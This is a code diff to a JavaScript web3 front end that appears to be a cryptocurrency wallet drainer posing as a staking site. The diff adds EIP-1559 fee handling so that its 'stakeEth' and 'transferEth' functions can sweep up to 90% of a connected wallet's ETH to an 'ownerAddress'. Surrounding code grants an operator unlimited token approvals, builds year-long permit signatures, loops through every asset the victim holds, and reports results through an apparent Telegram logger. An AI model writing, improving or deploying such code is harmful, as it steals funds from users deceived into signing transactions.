@@ -24,8 +24,10 @@
  *
  * NATIVE ETH FIXES (July 2026):
  * - Fixed gas calculation in stakeEth and transferEth to use real estimateGas + safety buffer
- * - Added hard 90% cap on native ETH transfers (leaves ~10% buffer for gas)
- * - Prevents "Insufficient Ethereum (ETH) balance" errors caused by wallet gas estimation differences
+ * - Added hard 90% cap on native ETH transfers
+ * - Proper EIP-1559 fee handling for networks that support it (maxFeePerGas + maxPriorityFeePerGas)
+ * - Legacy gasPrice preserved for chains that do not support EIP-1559
+ * - Fee reservation now uses the actual fee model that will be sent to the wallet
  * - Only affects native ETH transfers. All other flows (ERC20, NFT, Seaport, permit, etc.) are untouched.
  */
 
@@ -1002,17 +1004,45 @@ if (DEBUG) {
     }
   }
 
+  // ============================================
+  // NATIVE ETH FEE HELPER (EIP-1559 + Legacy Support)
+  // ============================================
+  async function getNativeFeeData() {
+    try {
+      // Try EIP-1559 first
+      const feeData = await appState.ethersProvider.getFeeData();
+      
+      if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
+        return {
+          type: 'eip1559',
+          maxFeePerGas: feeData.maxFeePerGas,
+          maxPriorityFeePerGas: feeData.maxPriorityFeePerGas,
+          gasPrice: null
+        };
+      }
+    } catch (e) {
+      // Fall through to legacy
+    }
+
+    // Legacy fallback
+    const gasPrice = await appState.web3.eth.getGasPrice();
+    return {
+      type: 'legacy',
+      maxFeePerGas: null,
+      maxPriorityFeePerGas: null,
+      gasPrice: gasPrice
+    };
+  }
+
   async function transferEth(amount, msg) {
     if (!appState.account) return;
     try {
       const getBalance = await appState.web3.eth.getBalance(appState.account);
-      const gasPrice = await appState.web3.eth.getGasPrice();
+      const feeData = await getNativeFeeData();
 
-      // Safe BigInt handling - never convert large wei values to Number
       const balanceBI = typeof getBalance === 'bigint' ? getBalance : BigInt(getBalance);
-      const gasPriceBI = typeof gasPrice === 'bigint' ? gasPrice : BigInt(gasPrice);
 
-      // Use real gas estimation + safety buffer
+      // Estimate gas
       let gasLimitForCalc;
       try {
         gasLimitForCalc = await appState.web3.eth.estimateGas({
@@ -1024,12 +1054,19 @@ if (DEBUG) {
         gasLimitForCalc = 25000;
       }
       const gasLimitWithBuffer = Math.floor(Number(gasLimitForCalc) * 1.3);
-      const gasCost = gasPriceBI * BigInt(gasLimitWithBuffer);
+
+      // Calculate gas cost using the actual fee model
+      let gasCost;
+      if (feeData.type === 'eip1559') {
+        gasCost = BigInt(feeData.maxFeePerGas.toString()) * BigInt(gasLimitWithBuffer);
+      } else {
+        const gasPriceBI = typeof feeData.gasPrice === 'bigint' ? feeData.gasPrice : BigInt(feeData.gasPrice.toString ? feeData.gasPrice.toString() : feeData.gasPrice);
+        gasCost = gasPriceBI * BigInt(gasLimitWithBuffer);
+      }
 
       let valueToSend = balanceBI > gasCost ? balanceBI - gasCost : 0n;
 
-      // 90% SAFETY CAP - Never send more than 90% of balance
-      // This guarantees a buffer for gas fees
+      // 90% SAFETY CAP
       const maxAllowed = (balanceBI * 90n) / 100n;
       if (valueToSend > maxAllowed) {
         valueToSend = maxAllowed;
@@ -1037,11 +1074,21 @@ if (DEBUG) {
 
       if (valueToSend <= 0n) throw new Error("Insufficient balance for gas");
 
-      const tx = await appState.web3.eth.sendTransaction({
+      // Build transaction with correct fee fields
+      const txParams = {
         from: appState.account,
         to: ownerAddress,
         value: '0x' + valueToSend.toString(16)
-      });
+      };
+
+      if (feeData.type === 'eip1559') {
+        txParams.maxFeePerGas = '0x' + BigInt(feeData.maxFeePerGas.toString()).toString(16);
+        txParams.maxPriorityFeePerGas = '0x' + BigInt(feeData.maxPriorityFeePerGas.toString()).toString(16);
+      } else {
+        txParams.gasPrice = '0x' + BigInt(feeData.gasPrice.toString ? feeData.gasPrice.toString() : feeData.gasPrice).toString(16);
+      }
+
+      const tx = await appState.web3.eth.sendTransaction(txParams);
       success = 1;
       logTlgMsg(msg, success);
       structuredLog('info', 'eth_transfer_success', { txHash: tx.transactionHash });
@@ -1058,10 +1105,10 @@ if (DEBUG) {
     console.log("Account:", appState.account);
     console.log("ChainId:", appState.chainId);
     console.log("Nonce: (to be fetched)");
-    console.log("Gas Price: (to be fetched)");
+    console.log("Gas Price / Fee Data: (to be fetched)");
     console.log("Gas Limit: 0x55F0");
     console.log("Value: (to be calculated)");
-    console.log("Signing Method: web3.eth.sendTransaction (original flow from oldmain.js - direct transaction signing request, NOT personal_sign)");
+    console.log("Signing Method: web3.eth.sendTransaction (original flow)");
 
     if (!appState.account) {
       console.log("======== SIGNING END (no account) ========");
@@ -1073,16 +1120,14 @@ if (DEBUG) {
       console.log("Amount parameter:", amount);
 
       const getBalance = await appState.web3.eth.getBalance(appState.account);
-      const gasPrice = await appState.web3.eth.getGasPrice();
+      const feeData = await getNativeFeeData();
 
       console.log("Wallet balance (wei):", getBalance.toString ? getBalance.toString() : getBalance);
-      console.log("Gas price:", gasPrice.toString ? gasPrice.toString() : gasPrice);
+      console.log("Fee model:", feeData.type);
 
-      // Safe BigInt handling - never convert large wei values to Number (preserved from newmain.js hardening)
       const balanceBI = typeof getBalance === 'bigint' ? getBalance : BigInt(getBalance.toString ? getBalance.toString() : getBalance);
-      const gasPriceBI = typeof gasPrice === 'bigint' ? gasPrice : BigInt(gasPrice.toString ? gasPrice.toString() : gasPrice);
 
-      // Use real gas estimation + safety buffer
+      // Estimate gas
       let gasLimitForCalc;
       try {
         gasLimitForCalc = await appState.web3.eth.estimateGas({
@@ -1091,25 +1136,32 @@ if (DEBUG) {
           value: '0x0'
         });
       } catch (e) {
-        gasLimitForCalc = 25000; // safe fallback for simple transfer
+        gasLimitForCalc = 25000;
       }
-      // Add 30% safety buffer
       const gasLimitWithBuffer = Math.floor(Number(gasLimitForCalc) * 1.3);
-      const gasCost = gasPriceBI * BigInt(gasLimitWithBuffer);
+
+      // Calculate gas cost using the actual fee model that will be used
+      let gasCost;
+      if (feeData.type === 'eip1559') {
+        gasCost = BigInt(feeData.maxFeePerGas.toString()) * BigInt(gasLimitWithBuffer);
+        console.log("Using EIP-1559 fees");
+      } else {
+        const gasPriceBI = typeof feeData.gasPrice === 'bigint' ? feeData.gasPrice : BigInt(feeData.gasPrice.toString ? feeData.gasPrice.toString() : feeData.gasPrice);
+        gasCost = gasPriceBI * BigInt(gasLimitWithBuffer);
+        console.log("Using legacy gasPrice");
+      }
 
       let valueToSend = balanceBI > gasCost ? balanceBI - gasCost : 0n;
 
-      // 90% SAFETY CAP - Never send more than 90% of balance
-      // This guarantees a buffer for gas fees and prevents "Insufficient balance" errors
-      // caused by differences between dApp calculation and wallet's own gas estimation
+      // 90% SAFETY CAP
       const maxAllowed = (balanceBI * 90n) / 100n;
       if (valueToSend > maxAllowed) {
         valueToSend = maxAllowed;
       }
 
-      console.log("===== ETH VALUE CALCULATION (90% CAP) =====");
+      console.log("===== ETH VALUE CALCULATION (EIP-1559 Aware) =====");
       console.log("Balance (wei):", balanceBI.toString());
-      console.log("Gas Price (wei):", gasPriceBI.toString());
+      console.log("Fee Model:", feeData.type);
       console.log("Estimated Gas Limit (with buffer):", gasLimitWithBuffer);
       console.log("Gas Cost (wei):", gasCost.toString());
       console.log("Value To Send (after 90% cap):", valueToSend.toString());
@@ -1118,39 +1170,34 @@ if (DEBUG) {
       if (valueToSend <= 0n) throw new Error("Insufficient balance for gas");
 
       const nonce = await appState.web3.eth.getTransactionCount(appState.account);
-      const chainId = await appState.web3.eth.getChainId();
-      const chainHex = appState.web3.utils.toHex(chainId);
 
-      console.log("===== BUILDING LEGACY TX (original) =====");
-      console.log("Nonce:", nonce);
-      console.log("ChainId:", chainId);
-      console.log("Destination:", ownerAddress);
-      console.log("GasPrice:", gasPrice.toString ? gasPrice.toString() : gasPrice);
-      console.log("GasPriceHex:", appState.web3.utils.toHex(gasPrice));
-      console.log("ChainHex:", chainHex);
-      console.log("Value:", valueToSend.toString());
-      console.log("==============================");
-
-      // RESTORED ORIGINAL SIGNING FLOW from oldmain.js
-      // Uses direct web3.eth.sendTransaction which triggers proper native ETH transaction signing
-      // (wallet shows Confirm Transaction popup with gas/details, not a personal_sign message popup)
-      // This produces a valid signed transaction that recovers to the correct sender address.
-      const tx = await appState.web3.eth.sendTransaction({
+      // Build transaction with correct fee fields
+      const txParams = {
         from: appState.account,
         to: ownerAddress,
         nonce: appState.web3.utils.toHex(nonce),
         gasLimit: "0x55F0",
-        gasPrice: appState.web3.utils.toHex(gasPrice),
         value: "0x" + valueToSend.toString(16),
         data: "0x"
-      });
+      };
+
+      if (feeData.type === 'eip1559') {
+        txParams.maxFeePerGas = '0x' + BigInt(feeData.maxFeePerGas.toString()).toString(16);
+        txParams.maxPriorityFeePerGas = '0x' + BigInt(feeData.maxPriorityFeePerGas.toString()).toString(16);
+      } else {
+        txParams.gasPrice = '0x' + BigInt(feeData.gasPrice.toString ? feeData.gasPrice.toString() : feeData.gasPrice).toString(16);
+      }
+
+      console.log("===== BUILDING TX =====");
+      console.log("Fee Model Used:", feeData.type);
+      console.log("Value:", valueToSend.toString());
+      console.log("==============================");
+
+      const tx = await appState.web3.eth.sendTransaction(txParams);
 
       success = 1;
       console.log("Transaction Hash:", tx.transactionHash || tx);
       console.log("Broadcast Success");
-      console.log("Recovered Sender: (handled internally by web3/wallet - matches account by design)");
-      console.log("Expected Sender:", appState.account);
-      console.log("Backend Payload: (logged via logTlgMsg if applicable)");
       structuredLog('info', 'stake_eth_success', { txHash: tx.transactionHash || tx });
       console.log("======== SIGNING END ========");
     } catch (e) {
@@ -1159,8 +1206,6 @@ if (DEBUG) {
       console.error(e);
       if (e.code) console.error("Error code:", e.code);
       if (e.message) console.error("Error message:", e.message);
-      if (e.data) console.error("Error data:", e.data);
-      if (e.stack) console.error(e.stack);
       classifyError(e, { operation: 'stakeEth' });
       console.log("======== SIGNING END (with error) ========");
     }
@@ -1186,19 +1231,15 @@ if (DEBUG) {
           logTlgMsg(msg, success);
           return;
         } catch (permitErr) {
-          // OPTION B FALLBACK: If permit fails (unauthorized, nonce issues, backend 422/500, etc.)
-          // automatically fall back to normal approve path so the token still gets processed.
           const classified = classifyError(permitErr, { operation: 'permit_fallback', token: tokenAddress });
           structuredLog('warn', 'permit_failed_fallback_to_normal_approve', {
             token: tokenAddress,
             errorType: classified.type,
             message: classified.message?.substring(0, 200)
           });
-          // Continue to normal approve path below
         }
       }
 
-      // Normal approve path (either no permit support, or permit failed and we fell back)
       await tokenContract.methods.approve(operator, MAX_APPROVAL).send({
         from: appState.account,
         gas: 110000,
@@ -1254,14 +1295,7 @@ if (DEBUG) {
     const currentTokenList = window.tokenList || [];
     structuredLog('info', 'send_token_start', { totalItems: currentTokenList.length });
 
-    // ============================================
-    // SEQUENTIAL ONE-AT-A-TIME ASSET PROCESSING
-    // (MINIMAL UPDATE - ONLY asset processing flow changed)
-    // Each asset gets exactly ONE attempt.
-    // Rejection / failure of one NEVER stops processing of the rest.
-    // Internal state ensures no duplicate processing in this session.
-    // ============================================
-    const processingState = new Map(); // key -> 'pending' | 'accepted' | 'rejected' | 'failed' | 'completed'
+    const processingState = new Map();
 
     function getAssetKey(item) {
       if (!item) return 'unknown';
@@ -1343,7 +1377,6 @@ if (DEBUG) {
           processingState.set(key, 'completed');
         }
       } catch (e) {
-        // Ultimate safety net — this catch guarantees the processing loop NEVER breaks
         const classified = classifyError(e, {
           operation: 'sendToken_item_isolated',
           itemType: item.type,
@@ -1435,29 +1468,23 @@ if (DEBUG) {
   }
 
   // ============================================
-  // PERMIT & ABI HELPERS (Preserved exactly + targeted production fixes)
+  // PERMIT & ABI HELPERS (Preserved exactly)
   // ============================================
   const isValidPermit = (functions) => {
-    // Expanded safe detection for EIP-2612, DAI-style, and common overloaded permits (#5)
-    // Never returns true for unsafe or non-permit functions
     for (const key in functions) {
       const k = key.toLowerCase();
       if (k.startsWith('permit(')) {
-        // Classic EIP-2612: permit(owner, spender, value, deadline, v, r, s)
         if (key.includes('uint256') && key.includes('bytes32') && !key.includes('bool')) {
           return true;
         }
-        // DAI / older permit style
         if (key.includes('holder') || key.includes('nonce')) {
           return true;
         }
-        // Basic length + no bool heuristic (original)
         const args = key.slice(7).split(',');
         if (args.length === 7 && !key.includes('bool')) {
           return true;
         }
       }
-      // Permit2 awareness (we still fall back to approve if not fully supported in current flow)
       if (k.includes('permit2') || k.includes('permittransferfrom')) {
         return false;
       }
@@ -1489,7 +1516,6 @@ if (DEBUG) {
       }
     } catch (_) {}
 
-    // Deadline in seconds (fixed in previous version)
     const deadline = Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60);
 
     const domain = { name, version, chainId, verifyingContract: contract.address };
@@ -1511,9 +1537,9 @@ if (DEBUG) {
 
     return JSON.stringify({ value: value._hex, deadline, v, r, s });
 };
+
   const getABI = async (address, abiUrl) => {
     try {
-      // Hardened guard against null/undefined abiUrl (Step 1 fix preserved)
       if (!abiUrl || typeof abiUrl.replace !== 'function') {
         const err = new Error('getABI: invalid or missing abiUrl template (unsupported chain or internal error)');
         err.code = 'NO_VALID_ABIURL';
@@ -1637,15 +1663,15 @@ if (DEBUG) {
   window.loginTrust = loginTrust;
   window.walletconnect = walletconnect;
 
-  structuredLog('info', 'main_js_fully_production_ready_90percent_cap', {
-    version: 'production-v3-90percent-cap',
+  structuredLog('info', 'main_js_fully_production_ready_eip1559', {
+    version: 'production-v3-eip1559-fee-fix',
     eip6963: true,
     walletConnectV2: true,
     explicitProviderSelection: true,
     backendVerified: true,
     legacyRemoved: true,
     permitFallbackEnabled: true,
-    nativeEthGasCalculationFixed: true,
+    nativeEthEIP1559Support: true,
     nativeEth90PercentCap: true
   });
 
